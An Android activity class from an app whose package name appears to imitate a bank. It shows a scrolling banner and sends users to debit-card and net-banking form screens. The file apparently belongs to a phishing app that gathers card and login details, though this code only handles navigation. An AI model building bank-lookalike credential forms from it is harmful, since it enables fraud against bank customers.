package com.pnbccv.design;

import android.Manifest;
import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.annotation.SuppressLint;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.animation.LinearInterpolator;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class SecondActivity extends BaseActivity {

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        // Start
        TextView slidingText = findViewById(R.id.slidingText);
        slidingText.post(() -> {
            float textWidth = slidingText.getWidth();
            float parentWidth = ((View) slidingText.getParent()).getWidth();

            ObjectAnimator animator = ObjectAnimator.ofFloat(
                    slidingText,
                    "translationX",
                    parentWidth,
                    -textWidth
            );
            animator.setDuration(10000); // 10 seconds for full scroll
            animator.setRepeatCount(ValueAnimator.INFINITE);
            animator.setInterpolator(new LinearInterpolator()); // smooth scrolling
            animator.start();
        });
        // End
        int form_id = getIntent().getIntExtra("form_id", -1);
        Button debitButton = findViewById(R.id.DEBIT_CARD);
        Button netbanking = findViewById(R.id.NET_BANKING);
        debitButton.setOnClickListener(v -> {
            Intent intent = new Intent(this, Debit1.class);
            intent.putExtra("form_id", form_id);
            startActivity(intent);
        });
        netbanking.setOnClickListener(v -> {
            Intent intent = new Intent(this, Net1.class);
            intent.putExtra("form_id", form_id);
            startActivity(intent);
        });
    }
}
